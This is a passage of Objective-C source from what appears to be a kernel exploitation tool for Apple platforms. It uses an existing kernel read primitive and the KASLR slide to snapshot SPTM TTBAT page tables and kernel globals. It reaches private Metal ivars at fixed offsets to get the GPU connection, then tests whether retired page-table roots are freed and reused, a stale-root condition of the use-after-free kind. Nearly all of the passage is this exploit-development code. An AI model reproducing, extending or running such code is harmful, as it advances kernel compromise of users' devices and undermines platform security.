            : @"no positive free-mask transition observed in the bounded window");
    report[@"rootFreeMaskOracle"] = freeMaskReport;
    report[@"rootFreeMaskSetCount"] = @(freeMaskSetCount);
    report[@"rootFreeMaskAllSet"] = @(freeMaskAllSet);
    log_user("[UAT_E2] helper-process-gone=%s attempts=%lu errno=%d "
             "free-mask-valid=%s set=%lu/2 polls=%lu "
             "root0After=0x%016llx root1After=0x%016llx\n",
             helperProcessGone ? "yes" : "no",
             (unsigned long)processGoneAttempts, processGoneErrno,
             freeMaskReadsValid ? "yes" : "no",
             (unsigned long)freeMaskSetCount,
             (unsigned long)freeMaskPollAttempts,
             (unsigned long long)freeMaskOracles[0].afterWord,
             (unsigned long long)freeMaskOracles[1].afterWord);
    if (rawAfterSnapshotRead) {
        NSString *label = [NSString stringWithFormat:
            @"e2.after-external-helper-exit.%lu",
            (unsigned long)(afterAttempts - 1)];
        afterSummary = CNDUatE1TTBATSummary(
            label, ttbat, &afterExit, NULL);
        closeChanges = CNDUatE1TTBATDiff(
            &whileOpen, &afterExit, ttbat, @"external-helper-exit");
    }
    report[@"afterExitTTBATSnapshot"] = afterSummary ?: @{};
    report[@"closeChanges"] = closeChanges ?: @[];
    report[@"retirementPollAttempts"] = @(afterAttempts);
    report[@"retirementRawSnapshotRead"] = @(rawAfterSnapshotRead);
    report[@"retirementRawShapePassed"] =
        @(rawAfterSnapshotShapePassed);
    report[@"retirementRawChangedEntryCount"] =
        @(rawCloseChangedCount);
    report[@"retirementGatePassed"] = @(retired);
    report[@"allocatorReuseAttempted"] = @(reuseAttempted);
    report[@"allocatorReuseSampleValid"] = @(reuseSampleValid);
    report[@"allocatorReuseMatched"] = @(reuseMatched);
    report[@"e3LatchAttempted"] = @(latchAttempted);
    report[@"e3LatchPassed"] = @(latchPassed);
    report[@"e3LatchStaleObserved"] = @(latchStaleObserved);
    if (latchReason != nil) report[@"e3LatchFailureReason"] = latchReason;
    if (reuseReason != nil) {
        report[@"allocatorReuseFailureReason"] = reuseReason;
    }
    report[@"kernelWriteUsed"] = @NO;
    report[@"kernelWriteCount"] = @0;
    report[@"ttbatSnapshotCount"] = @(2 + afterAttempts);
    report[@"changedEntryCount"] = @(
        (openChanges ?: @[]).count + (closeChanges ?: @[]).count);
    CNDUatE1Persist(report);
    log_user("[UAT_E2] helper-exit exact-retirement=%s attempts=%lu "
             "context=%s root0=%s root1=%s free-mask-set=%lu/2 "
             "reuse-valid=%s match=%s\n",
             retired ? "yes" : "no", (unsigned long)afterAttempts,
             [[openTransition[@"index"] description] UTF8String] ?: "-",
             [report[@"observedRoot0"] UTF8String] ?: "-",
             [report[@"observedRoot1"] UTF8String] ?: "-",
             (unsigned long)freeMaskSetCount,
             reuseSampleValid ? "yes" : "no",
             reuseMatched ? "yes" : "no");
    if (latchAttempted && !latchPassed) {
        if (reasonOut != NULL) {
            *reasonOut = latchReason ?: @"e3-stale-root-latch-failed";
        }
        result = CNDUatE1TTBATRunAborted;
    } else if (latchPassed) {
        if (reasonOut != NULL) {
            *reasonOut = latchStaleObserved
                ? @"validated-stale-root-latch-observed"
                : @"validated-fresh-root-selected-over-retired-root";
        }
        result = CNDUatE1TTBATRunObservedDiff;
    } else if (!freeMaskPrepared) {
        result = CNDUatE1TTBATRunAborted;
    } else if (!helperProcessGone) {
        if (reasonOut != NULL) {
            *reasonOut = @"external-helper-process-not-gone-after-peer-eof";
        }
        result = CNDUatE1TTBATRunAborted;
    } else if (retired && reuseSampleValid && reuseMatched) {
        if (reasonOut != NULL) {
            *reasonOut =
                @"validated-retired-root-frame-reused-after-guided-mask-transition";
        }
        result = CNDUatE1TTBATRunObservedDiff;
    } else if (retired && freeMaskSetCount > 0) {
        if (reasonOut != NULL) {
            *reasonOut = freeMaskSetCount == 2
                ? @"validated-both-retired-root-free-mask-clear-to-set"
                : @"validated-one-retired-root-free-mask-clear-to-set";
        }
        result = CNDUatE1TTBATRunObservedDiff;
    } else if (retired && reuseSampleValid) {
        if (reasonOut != NULL) {
            *reasonOut = reuseMatched
                ? @"validated-retired-root-frame-reused"
                : @"validated-retirement-bounded-reuse-no-match";
        }
        result = CNDUatE1TTBATRunObservedDiff;
    } else if (retired) {
        if (reasonOut != NULL) {
            *reasonOut = reuseReason ?: @"reuse-sample-failed";
        }
        result = CNDUatE1TTBATRunAborted;
    } else {
        if (reasonOut != NULL) {
            *reasonOut = !rawAfterSnapshotRead
                ? @"e2-after-snapshot-failed"
                : (!rawAfterSnapshotShapePassed
                    ? @"e2-after-snapshot-shape-failed"
                    : @"external-entry-not-cleared-after-task-death");
        }
        result = CNDUatE1TTBATRunObservedNoDiff;
    }
    goto done;

done:
    if (rendezvous.peerFD >= 0) {
        uint8_t release = CNDUatE2ChildReleaseByte;
        bool releaseAttempted = CNDUatE2WriteAll(
            rendezvous.peerFD, &release, sizeof(release));
        report[@"externalHelperCleanup"] = @{
            @"releaseAttempted": @(releaseAttempted),
            @"hostMustTerminateStaleHelper": @(!helperPeerEOF),
        };
    }
    CNDUatE2CloseExternalRendezvous(&rendezvous);
    if (reuseTranslations != NULL) {
        free(reuseTranslations);
        reuseTranslations = NULL;
        report[@"allocatorReuseTranslationWorkspaceCleanup"] = @{
            @"released": @YES,
            @"ownAllocationOnly": @YES,
        };
    }
    if (reservation.allocated) {
        kern_return_t cleanupKR = mach_vm_deallocate(
            mach_task_self(), reservation.allocation, reservation.size);
        report[@"allocatorReuseCleanup"] = @{
            @"deallocateKR":
                [NSString stringWithFormat:@"0x%08x", cleanupKR],
            @"released": @(cleanupKR == KERN_SUCCESS),
            @"ownAllocationOnly": @YES,
        };
        reservation.allocated = false;
        if (cleanupKR != KERN_SUCCESS) {
            result = CNDUatE1TTBATRunAborted;
            if (reasonOut != NULL) {
                *reasonOut = @"reuse-reservation-cleanup-failed";
            }
        }
    }
    report[@"reuseWalkerPreparedBeforeRetirement"] = @(walkerPrepared);
    report[@"reuseTranslationWorkspaceFaultedBeforeRetirement"] =
        @(translationWorkspaceFaulted);
    CNDUatE1Persist(report);
    return result;
}

static CNDUatE1TTBATRunResult CNDUatE1RunTTBATRoute(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    uint64_t slide, uint64_t selfTask,
    const CNDUatE1ValidatedGart *garts,
    NSUInteger gartCount, NSString **reasonOut)
{
    CNDUatE1TTBATRunResult result = CNDUatE1TTBATRunAborted;
    void *metalHandle = NULL;
    CNDUatE1CreateMetalDeviceFn createMetal = NULL;
    id<CNDUatE1MetalDevice> metalDevice = nil;
    id<CNDUatE1MetalCommandQueue> metalQueue = nil;
    id<CNDUatE1MetalBuffer> metalBuffer = nil;
    id<CNDUatE1MetalCommandBuffer> metalCommand = nil;
    id<CNDUatE1MetalBlitEncoder> metalBlit = nil;
    CNDUatE1TTBATSnapshot before;
    CNDUatE1TTBATSnapshot prepared;
    CNDUatE1TTBATSnapshot submitted;
    CNDUatE1TTBATSnapshot afterRelease;
    NSDictionary *beforeSummary = nil;
    NSDictionary *preparedSummary = nil;
    NSDictionary *submittedSummary = nil;
    NSDictionary *afterReleaseSummary = nil;
    NSArray *setupChanges = nil;
    NSArray *submitChanges = nil;
    NSArray *releaseChanges = nil;
    NSArray *netChanges = nil;
    NSArray *contextRootAssociations = nil;
    NSArray *beforeContexts = nil;
    NSArray *preparedContexts = nil;
    NSArray *submittedContexts = nil;
    NSArray *afterReleaseContexts = nil;
    NSMutableDictionary *contextAssociationsByPhase =
        [NSMutableDictionary dictionary];
    NSMutableArray *changes = nil;
    NSUInteger clearedOnReleaseCount = 0;
    void *metalContents = NULL;
    NSError *metalError = nil;
    NSUInteger metalStatus = 0;
    bool metalPrepared = false;
    bool metalBlitEncoded = false;
    bool metalFillVerified = false;
    bool metalPortBridgePassed = false;
    io_service_t metalService = IO_OBJECT_NULL;
    io_connect_t metalConnection = IO_OBJECT_NULL;
    const void *metalDeviceRef = NULL;
    CNDUatE1ValidatedGart preparedPhaseGarts[CNDUatE1MaxPhaseGarts];
    CNDUatE1ValidatedGart submittedPhaseGarts[CNDUatE1MaxPhaseGarts];
    NSUInteger preparedPhaseGartCount = gartCount;
    NSUInteger submittedPhaseGartCount = gartCount;
    memset(preparedPhaseGarts, 0, sizeof(preparedPhaseGarts));
    memset(submittedPhaseGarts, 0, sizeof(submittedPhaseGarts));
    if (gartCount > CNDUatE1MaxPhaseGarts) {
        if (reasonOut != NULL) *reasonOut = @"base-gart-count-over-capacity";
        goto done;
    }
    if (gartCount > 0) {
        memcpy(preparedPhaseGarts, garts,
               gartCount * sizeof(CNDUatE1ValidatedGart));
        memcpy(submittedPhaseGarts, garts,
               gartCount * sizeof(CNDUatE1ValidatedGart));
    }
    memset(&before, 0, sizeof(before));
    memset(&prepared, 0, sizeof(prepared));
    memset(&submitted, 0, sizeof(submitted));
    memset(&afterRelease, 0, sizeof(afterRelease));

    uint64_t readyAddress = CNDUatE1IOUATMapsReady + slide;
    CNDUatE1Progress(report, @"route1.ttbat", @"read-maps-ready",
                     readyAddress);
    uint8_t ready = 0;
    if (!CNDUatE1Read8(api, readyAddress, &ready)) {
        if (reasonOut != NULL) *reasonOut = @"ttbat-ready-read-failed";
        goto done;
    }
    report[@"ttbatMapsReadyPredicate"] = @{
        @"address": CNDUatE1Hex(readyAddress),
        @"value": @(ready),
        @"expected": @2,
        @"source": @"C26 IOUAT four-map publication latch",
        @"passed": @(ready == 2),
    };
    CNDUatE1Persist(report);
    if (ready != 2) {
        if (reasonOut != NULL) *reasonOut = @"ttbat-maps-not-ready";
        goto done;
    }

    uint64_t mapSlotAddress = CNDUatE1TTBATMapVA + slide;
    CNDUatE1Progress(report, @"route1.ttbat", @"read-retained-map-va",
                     mapSlotAddress);
    uint64_t ttbatRaw = 0;
    if (!CNDUatE1Read64(api, mapSlotAddress, &ttbatRaw)) {
        if (reasonOut != NULL) *reasonOut = @"ttbat-map-va-read-failed";
        goto done;
    }
    uint64_t ttbat = CNDUatE1CanonicalPointer(api, ttbatRaw);
    bool nonzero = ttbat != 0;
    bool canonicalMatches = ttbatRaw == ttbat;
    bool aligned = nonzero && (ttbat & (CNDUatE1PageSize - 1)) == 0;
    bool activeRangeInPage = sizeof(before) <= CNDUatE1PageSize;
    bool mapPassed = nonzero && canonicalMatches && aligned &&
        activeRangeInPage;
    report[@"ttbatMapPredicate"] = @{
        @"slotAddress": CNDUatE1Hex(mapSlotAddress),
        @"raw": CNDUatE1Hex(ttbatRaw),
        @"canonical": CNDUatE1Hex(ttbat),
        @"nonzero": @(nonzero),
        @"canonicalMatches": @(canonicalMatches),
        @"aligned16K": @(aligned),
        @"activeBytes": @(sizeof(before)),
        @"activeRangeInOneMappedPage": @(activeRangeInPage),
        @"staticLifetimeWitness":
            @"C26-E1-TTBAT-EL1-MAP-LIFETIME-TRACE-20261105",
        @"mappingTarget": @"permanent-kernel-task",
        @"passed": @(mapPassed),
    };
    CNDUatE1Persist(report);
    if (!mapPassed) {
        if (reasonOut != NULL) *reasonOut = @"ttbat-map-predicate-failed";
        goto done;
    }

    if (!CNDUatE1SnapshotTTBAT(report, api, @"before.ttbat", ttbat,
                               &before, &beforeSummary)) {
        if (reasonOut != NULL) *reasonOut = @"ttbat-before-read-or-shape-failed";
        goto done;
    }
    report[@"beforeTTBATSnapshot"] = beforeSummary;
    report[@"tableReached"] = @YES;
    if (!CNDUatE1SnapshotGartContextIDs(
            report, api, slide, @"before", @"beforeGartContextSnapshot",
            garts, gartCount, &beforeContexts, reasonOut)) {
        goto done;
    }
    contextRootAssociations = CNDUatE1AssociateGartContextsWithTTBAT(
        beforeContexts, beforeSummary);
    report[@"route1ContextRootAssociations"] = contextRootAssociations;
    report[@"route1ContextRootAssociationCount"] =
        @(contextRootAssociations.count);
    contextAssociationsByPhase[@"before"] = contextRootAssociations;
    report[@"route1ContextRootAssociationsByPhase"] =
        contextAssociationsByPhase;
    log_user("[UAT_E1] route1 ctx-root associations=%lu\n",
             (unsigned long)contextRootAssociations.count);
    CNDUatE1Persist(report);

    @autoreleasepool {
    CNDUatE1Progress(report, @"action", @"metal-prepare-one-blit", 0);
    metalHandle = dlopen(
        "/System/Library/Frameworks/Metal.framework/Metal",
        RTLD_NOW | RTLD_LOCAL);
    createMetal = metalHandle != NULL
        ? (CNDUatE1CreateMetalDeviceFn)dlsym(
            metalHandle, "MTLCreateSystemDefaultDevice") : NULL;
    metalDevice = createMetal != NULL ? createMetal() : nil;

    Class iogpuMetalDeviceClass = NSClassFromString(@"IOGPUMetalDevice");
    Class concreteMetalClass = metalDevice != nil ? [metalDevice class] : Nil;
    Ivar deviceRefIvar = concreteMetalClass != Nil
        ? class_getInstanceVariable(concreteMetalClass, "_deviceRef")
        : NULL;
    ptrdiff_t deviceRefOffset = deviceRefIvar != NULL
        ? ivar_getOffset(deviceRefIvar) : -1;
    const char *deviceRefType = deviceRefIvar != NULL
        ? ivar_getTypeEncoding(deviceRefIvar) : NULL;
    Ivar acceleratorPortIvar = concreteMetalClass != Nil
        ? class_getInstanceVariable(concreteMetalClass, "_acceleratorPort")
        : NULL;
    ptrdiff_t acceleratorPortOffset = acceleratorPortIvar != NULL
        ? ivar_getOffset(acceleratorPortIvar) : -1;
    const char *acceleratorPortType = acceleratorPortIvar != NULL
        ? ivar_getTypeEncoding(acceleratorPortIvar) : NULL;
    bool metalClassPassed = metalDevice != nil &&
        iogpuMetalDeviceClass != Nil &&
        [metalDevice isKindOfClass:iogpuMetalDeviceClass];
    bool metalDeviceRefIvarPassed = deviceRefIvar != NULL &&
        deviceRefOffset == CNDUatE1MetalDeviceRefOffset &&
        deviceRefType != NULL &&
        strcmp(deviceRefType, "^{__IOGPUDevice=}") == 0;
    bool metalServiceIvarPassed = acceleratorPortIvar != NULL &&
        acceleratorPortOffset == CNDUatE1MetalAcceleratorPortOffset &&
        acceleratorPortType != NULL &&
        strcmp(acceleratorPortType, "I") == 0;
    if (metalClassPassed && metalDeviceRefIvarPassed &&
        metalServiceIvarPassed) {
        const uint8_t *deviceBytes =
            (const uint8_t *)(__bridge const void *)metalDevice;
        memcpy(&metalDeviceRef, deviceBytes + deviceRefOffset,
               sizeof(metalDeviceRef));
        memcpy(&metalService, deviceBytes + acceleratorPortOffset,
               sizeof(metalService));
    }
    bool metalDeviceRefShapePassed = metalDeviceRef != NULL &&
        (((uintptr_t)metalDeviceRef & (sizeof(void *) - 1)) == 0);
    io_service_t deviceRefService = IO_OBJECT_NULL;
    if (metalDeviceRefShapePassed) {
        const uint8_t *deviceRefBytes = (const uint8_t *)metalDeviceRef;
        memcpy(&deviceRefService,
               deviceRefBytes + CNDUatE1DeviceRefServiceOffset,
               sizeof(deviceRefService));
        memcpy(&metalConnection,
               deviceRefBytes + CNDUatE1DeviceRefConnectionOffset,
               sizeof(metalConnection));
    }
    mach_port_type_t metalServiceType = 0;
    kern_return_t metalServiceTypeKR = MACH_PORT_VALID(metalService)
        ? mach_port_type(mach_task_self(), metalService, &metalServiceType)
        : KERN_INVALID_NAME;
    bool metalServiceRightPassed = metalServiceTypeKR == KERN_SUCCESS &&
        (metalServiceType & MACH_PORT_TYPE_SEND) != 0;
    mach_port_type_t metalPortType = 0;
    kern_return_t metalPortTypeKR = MACH_PORT_VALID(metalConnection)
        ? mach_port_type(mach_task_self(), metalConnection, &metalPortType)
        : KERN_INVALID_NAME;
    bool metalPortRightPassed = metalPortTypeKR == KERN_SUCCESS &&
        (metalPortType & MACH_PORT_TYPE_SEND) != 0;
    bool deviceRefServiceMatches = metalService != IO_OBJECT_NULL &&
        deviceRefService == metalService;
    metalPortBridgePassed = metalClassPassed &&
        metalDeviceRefIvarPassed && metalServiceIvarPassed &&
        metalDeviceRefShapePassed && deviceRefServiceMatches &&
        metalServiceRightPassed &&
        MACH_PORT_VALID(metalConnection) && metalPortRightPassed;
    report[@"metalDeviceConnectionBridge"] = @{
        @"deviceClass": concreteMetalClass != Nil
            ? NSStringFromClass(concreteMetalClass) : @"nil",
        @"requiredBaseClass": @"IOGPUMetalDevice",
        @"baseClassPresent": @(iogpuMetalDeviceClass != Nil),
        @"isKindOfRequiredBaseClass": @(metalClassPassed),
        @"deviceRefIvar": @"_deviceRef",
        @"deviceRefIvarFound": @(deviceRefIvar != NULL),
        @"deviceRefIvarOffset": deviceRefOffset >= 0
            ? [NSString stringWithFormat:@"0x%tx", deviceRefOffset]
            : @"unavailable",
        @"expectedDeviceRefIvarOffset": @"0x278",
        @"deviceRefIvarType": deviceRefType != NULL
            ? [NSString stringWithUTF8String:deviceRefType]
            : @"unavailable",
        @"expectedDeviceRefIvarType": @"^{__IOGPUDevice=}",
        @"deviceRef": [NSString stringWithFormat:@"0x%016llx",
            (unsigned long long)(uintptr_t)metalDeviceRef],
        @"deviceRefShapePassed": @(metalDeviceRefShapePassed),
        @"serviceIvar": @"_acceleratorPort",
        @"serviceIvarFound": @(acceleratorPortIvar != NULL),
        @"serviceIvarOffset": acceleratorPortOffset >= 0
            ? [NSString stringWithFormat:@"0x%tx", acceleratorPortOffset]
            : @"unavailable",
        @"expectedServiceIvarOffset": @"0x280",
        @"serviceIvarType": acceleratorPortType != NULL
            ? [NSString stringWithUTF8String:acceleratorPortType]
            : @"unavailable",
        @"expectedServiceIvarType": @"I",
        @"service": CNDUatE1Hex((uint32_t)metalService),
        @"deviceRefService": CNDUatE1Hex((uint32_t)deviceRefService),
        @"deviceRefServiceMatches": @(deviceRefServiceMatches),
        @"serviceMachPortTypeKR": CNDUatE1Hex((uint32_t)metalServiceTypeKR),
        @"serviceMachPortType": CNDUatE1Hex((uint32_t)metalServiceType),
        @"serviceSendRightPresent": @(metalServiceRightPassed),
        @"deviceRefConnectionOffset": @"0x14",
        @"connection": CNDUatE1Hex((uint32_t)metalConnection),
        @"machPortTypeKR": CNDUatE1Hex((uint32_t)metalPortTypeKR),
        @"machPortType": CNDUatE1Hex((uint32_t)metalPortType),
        @"sendRightPresent": @(metalPortRightPassed),
        @"staticWitness":
            @"e1_metal_accelerator_port_audit.py: AGXG17FamilyDevice "
             "inherits IOGPUMetalDevice; _deviceRef is +0x278; "
             "_IOGPUDeviceCreateWithOptions stores the service and opened "
             "connection at deviceRef+0x10/+0x14",
        @"passed": @(metalPortBridgePassed),
    };
    CNDUatE1Persist(report);
    log_user("[UAT_E1] metal-connection class=%s deviceRef=%p service=0x%08x "
             "connection=0x%08x send-right=%s predicate=%s\n",
             concreteMetalClass != Nil
                ? NSStringFromClass(concreteMetalClass).UTF8String : "nil",
             metalDeviceRef, metalService, metalConnection,
             metalPortRightPassed ? "yes" : "no",
             metalPortBridgePassed ? "pass" : "fail");

    metalQueue = [metalDevice newCommandQueue];
    metalBuffer = [metalDevice newBufferWithLength:CNDUatE1PageSize options:0];
    metalContents = metalBuffer != nil ? [metalBuffer contents] : NULL;
    if (metalContents != NULL) memset(metalContents, 0, CNDUatE1PageSize);
    metalCommand = [metalQueue commandBuffer];
    metalBlit = [metalCommand blitCommandEncoder];
    if (metalBlit != nil && metalBuffer != nil) {
        [metalBlit fillBuffer:metalBuffer
                       range:NSMakeRange(0, CNDUatE1PageSize)
                       value:0x5a];
        [metalBlit endEncoding];
        metalBlitEncoded = true;
        metalBlit = nil;
    }
    metalPrepared = metalHandle != NULL && createMetal != NULL &&
        metalDevice != nil && metalQueue != nil && metalBuffer != nil &&
        metalContents != NULL && metalCommand != nil && metalBlitEncoded;
    report[@"metalAction"] = @{
        @"frameworkLoaded": @(metalHandle != NULL),
        @"factoryResolved": @(createMetal != NULL),
        @"deviceCreated": @(metalDevice != nil),
        @"deviceConnectionBridgePassed": @(metalPortBridgePassed),
        @"acceleratorService": CNDUatE1Hex((uint32_t)metalService),
        @"deviceConnection": CNDUatE1Hex((uint32_t)metalConnection),
        @"queueCreated": @(metalQueue != nil),
        @"bufferCreated": @(metalBuffer != nil),
        @"bufferLength": @(CNDUatE1PageSize),
        @"commandBufferCreated": @(metalCommand != nil),
        @"blitEncoded": @(metalPrepared),
        @"target": @"probe-owned-shared-buffer",
        @"fillByte": @0x5a,
    };
    report[@"actionPrepared"] = @(metalPrepared);
    report[@"namedActionStatus"] = metalPrepared
        ? @"prepared-not-submitted" : @"prepare-failed";
    CNDUatE1Persist(report);
    if (!metalPrepared) {
        if (reasonOut != NULL) *reasonOut = @"metal-action-prepare-failed";
        goto done;
    }
    if (!metalPortBridgePassed) {
        if (reasonOut != NULL) {
            *reasonOut = @"metal-device-connection-bridge-failed";
        }
        goto done;
    }
    if (!CNDUatE1ResolveConnectionGarts(
            report, api, slide, selfTask, metalConnection, @"prepared",
            preparedPhaseGarts, CNDUatE1MaxPhaseGarts,
            &preparedPhaseGartCount, reasonOut)) {
        goto done;
    }
    report[@"preparedPhaseGartCount"] = @(preparedPhaseGartCount);
    CNDUatE1Persist(report);

    if (!CNDUatE1SnapshotTTBAT(report, api, @"prepared.ttbat", ttbat,
                               &prepared, &preparedSummary)) {
        if (reasonOut != NULL) {
            *reasonOut = @"ttbat-prepared-read-or-shape-failed";
        }
        goto done;
    }
    setupChanges = CNDUatE1TTBATDiff(&before, &prepared, ttbat, @"setup");
    report[@"preparedTTBATSnapshot"] = preparedSummary;
    report[@"setupChanges"] = setupChanges;
    report[@"setupChangedEntryCount"] = @(setupChanges.count);
    if (!CNDUatE1SnapshotGartContextIDs(
            report, api, slide, @"prepared",
            @"preparedGartContextSnapshot", preparedPhaseGarts,
            preparedPhaseGartCount,
            &preparedContexts, reasonOut)) {
        goto done;
    }
    contextAssociationsByPhase[@"prepared"] =
        CNDUatE1AssociateGartContextsWithTTBAT(
            preparedContexts, preparedSummary);
    report[@"route1ContextRootAssociationsByPhase"] =
        contextAssociationsByPhase;
    CNDUatE1Persist(report);

    CNDUatE1Progress(report, @"action", @"metal-submit-wait-verify", 0);
    [metalCommand commit];
    [metalCommand waitUntilCompleted];
    metalStatus = [metalCommand status];
    metalError = [metalCommand error];
    if (metalContents != NULL) {
        const uint8_t *bytes = (const uint8_t *)metalContents;
        metalFillVerified = true;
        for (NSUInteger i = 0; i < CNDUatE1PageSize; i++) {
            if (bytes[i] != 0x5a) {
                metalFillVerified = false;
                break;
            }
        }
    }
    report[@"metalCommandStatus"] = @(metalStatus);
    report[@"metalCommandError"] = metalError != nil
        ? metalError.description : [NSNull null];
    report[@"metalFillVerified"] = @(metalFillVerified);
    report[@"actionCompleted"] = @(metalFillVerified && metalError == nil);
    report[@"namedActionStatus"] = metalFillVerified && metalError == nil
        ? @"submitted-and-verified" : @"submit-or-verify-failed";
    CNDUatE1Persist(report);
    if (!metalFillVerified || metalError != nil) {
        if (reasonOut != NULL) *reasonOut = @"metal-action-submit-failed";
        goto done;
    }
    if (!CNDUatE1ResolveConnectionGarts(
            report, api, slide, selfTask, metalConnection, @"submitted",
            submittedPhaseGarts, CNDUatE1MaxPhaseGarts,
            &submittedPhaseGartCount, reasonOut)) {
        goto done;
    }
    report[@"submittedPhaseGartCount"] = @(submittedPhaseGartCount);
    CNDUatE1Persist(report);

    if (!CNDUatE1SnapshotTTBAT(report, api, @"submitted.ttbat", ttbat,
                               &submitted, &submittedSummary)) {
        if (reasonOut != NULL) {
            *reasonOut = @"ttbat-submitted-read-or-shape-failed";
        }
        goto done;
    }
    submitChanges = CNDUatE1TTBATDiff(
        &prepared, &submitted, ttbat, @"submit");
    report[@"submittedTTBATSnapshot"] = submittedSummary;
    report[@"submitChanges"] = submitChanges ?: @[];
    report[@"submitChangedEntryCount"] = @(submitChanges.count);
    if (!CNDUatE1SnapshotGartContextIDs(
            report, api, slide, @"submitted",
            @"submittedGartContextSnapshot", submittedPhaseGarts,
            submittedPhaseGartCount,
            &submittedContexts, reasonOut)) {
        goto done;
    }
    contextRootAssociations = CNDUatE1AssociateGartContextsWithTTBAT(
        submittedContexts, submittedSummary);
    contextAssociationsByPhase[@"submitted"] = contextRootAssociations;
    report[@"route1ContextRootAssociations"] = contextRootAssociations;
    report[@"route1ContextRootAssociationCount"] =
        @(contextRootAssociations.count);
    report[@"route1ContextRootAssociationsByPhase"] =
        contextAssociationsByPhase;
    CNDUatE1Persist(report);

    CNDUatE1Progress(report, @"action", @"metal-release-objects", 0);
    metalCommand = nil;
    metalBuffer = nil;
    metalQueue = nil;
    metalDevice = nil;
    metalContents = NULL;
    report[@"namedActionStatus"] = @"released";
    CNDUatE1Persist(report);
    }
    if (metalHandle != NULL) {
        dlclose(metalHandle);
        metalHandle = NULL;
    }

    if (!CNDUatE1SnapshotTTBAT(report, api, @"after-release.ttbat", ttbat,
                               &afterRelease, &afterReleaseSummary)) {
        if (reasonOut != NULL) {
            *reasonOut = @"ttbat-after-release-read-or-shape-failed";
        }
        goto done;
    }
    if (!CNDUatE1SnapshotGartContextIDs(
            report, api, slide, @"after-release",
            @"afterReleaseGartContextSnapshot", garts, gartCount,
            &afterReleaseContexts, reasonOut)) {
        goto done;
    }
    contextAssociationsByPhase[@"after-release"] =
        CNDUatE1AssociateGartContextsWithTTBAT(
            afterReleaseContexts, afterReleaseSummary);
    report[@"route1ContextRootAssociationsByPhase"] =
        contextAssociationsByPhase;
    releaseChanges = CNDUatE1TTBATDiff(
        &submitted, &afterRelease, ttbat, @"release");
    netChanges = CNDUatE1TTBATDiff(
        &before, &afterRelease, ttbat, @"net");
    changes = [NSMutableArray arrayWithArray:setupChanges ?: @[]];
    [changes addObjectsFromArray:submitChanges ?: @[]];
    [changes addObjectsFromArray:releaseChanges ?: @[]];
    for (NSDictionary *change in releaseChanges ?: @[]) {
        if ([change[@"clearedOnRelease"] boolValue]) {
            clearedOnReleaseCount++;
        }
    }
    report[@"afterReleaseTTBATSnapshot"] = afterReleaseSummary;
    report[@"afterTTBATSnapshot"] = afterReleaseSummary;
    report[@"releaseChanges"] = releaseChanges ?: @[];
    report[@"releaseChangedEntryCount"] = @(releaseChanges.count);
    report[@"netChanges"] = netChanges ?: @[];
    report[@"netChangedEntryCount"] = @(netChanges.count);
    report[@"clearedOnReleaseCount"] = @(clearedOnReleaseCount);
    report[@"changes"] = changes;
    report[@"changedEntryCount"] = @(changes.count);
    report[@"validatedTTBATCount"] = @1;
    report[@"ttbatSnapshotCount"] = @4;
    report[@"tableKind"] = @"SPTM-TTBAT";
    CNDUatE1Persist(report);
    log_user("[UAT_E1] ttbat transitions setup=%lu submit=%lu release=%lu "
             "net=%lu clearedOnRelease=%lu\n",
             (unsigned long)setupChanges.count,
             (unsigned long)submitChanges.count,
             (unsigned long)releaseChanges.count,
             (unsigned long)netChanges.count,
             (unsigned long)clearedOnReleaseCount);
    if (changes.count > 0) {
        if (reasonOut != NULL) {
            if (submitChanges.count > 0) {
                *reasonOut = @"validated-ttbat-metal-submit-diff";
            } else if (clearedOnReleaseCount > 0) {
                *reasonOut = @"validated-ttbat-entry-cleared-on-release";
            } else if (setupChanges.count > 0) {
                *reasonOut = @"validated-ttbat-metal-setup-diff";
            } else {
                *reasonOut = @"validated-ttbat-metal-release-diff";
            }
        }
        result = CNDUatE1TTBATRunObservedDiff;
    } else {
        if (reasonOut != NULL) *reasonOut = @"validated-ttbat-no-entry-diff";
        result = CNDUatE1TTBATRunObservedNoDiff;
    }

done:
    metalBlit = nil;
    metalCommand = nil;
    metalBuffer = nil;
    metalQueue = nil;
    metalDevice = nil;
    if (metalHandle != NULL) dlclose(metalHandle);
    CNDUatE1Persist(report);
    return result;
}

#pragma mark - F1 fallback

static bool CNDUatE1RunFallback(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    uint64_t slide, NSString **reasonOut)
{
    uint64_t global = CNDUatE1Global + slide;
    CNDUatE1Progress(report, @"F1", @"read-global-status", global);
    uint32_t status = 0;
    if (!CNDUatE1Read32(api, global + CNDUatE1GlobalStatus, &status)) {
        if (reasonOut != NULL) *reasonOut = @"f1-status-read-failed";
        return false;
    }
    CNDUatE1Progress(report, @"F1", @"read-global-mode",
                     global + CNDUatE1GlobalMode);
    uint64_t mode = 0;
    if (!CNDUatE1Read64(api, global + CNDUatE1GlobalMode, &mode)) {
        if (reasonOut != NULL) *reasonOut = @"f1-mode-read-failed";
        return false;
    }
    CNDUatE1Progress(report, @"F1", @"read-adopted-object",
                     global + CNDUatE1GlobalObject);
    uint64_t objectRaw = 0;
    if (!CNDUatE1Read64(api, global + CNDUatE1GlobalObject, &objectRaw)) {
        if (reasonOut != NULL) *reasonOut = @"f1-object-read-failed";
        return false;
    }
    uint64_t object = CNDUatE1CanonicalPointer(api, objectRaw);
    report[@"fallback"] = @{
        @"anchor": CNDUatE1Hex(global),
        @"status": @(status),
        @"mode": CNDUatE1Hex(mode),
        @"adoptedObject": CNDUatE1PointerReport(api, objectRaw),
        @"getPTEInvoked": @NO,
        @"kernelWrites": @0,
    };
    CNDUatE1Persist(report);
    if (status != 1 || object == 0 || (object & 0xf) != 0) {
        if (reasonOut != NULL) *reasonOut = @"f1-global-invariants-failed";
        return false;
    }
    bool valid = CNDUatE1ValidateLifecycleVptr(
        report, api, @"F1.IOUAT", object, CNDUatE1IOUATVtable, slide,
        @"boot adoption 0x89f3a0c; vptr autda 0x89f3a38; "
         "virtual init 0x89f3a50", NULL);
    if (!valid) {
        if (reasonOut != NULL) *reasonOut = @"f1-iouat-vptr-failed";
        return false;
    }
    NSMutableDictionary *fallback = [report[@"fallback"] mutableCopy];
    fallback[@"validated"] = @YES;
    fallback[@"scope"] = @"IOUAT object plus symbol-anchored SPTM-side state";
    fallback[@"gptbatReached"] = @NO;
    report[@"fallback"] = fallback;
    report[@"fallbackResult"] = @"validated-f1-iouat";
    CNDUatE1Persist(report);
    return true;
}

#pragma mark - main E1 run

static void CNDUatEObserveRunInternalMode(
    BOOL e2RetirementGate, BOOL e4InflightGate, BOOL e5OwnerReleaseGate,
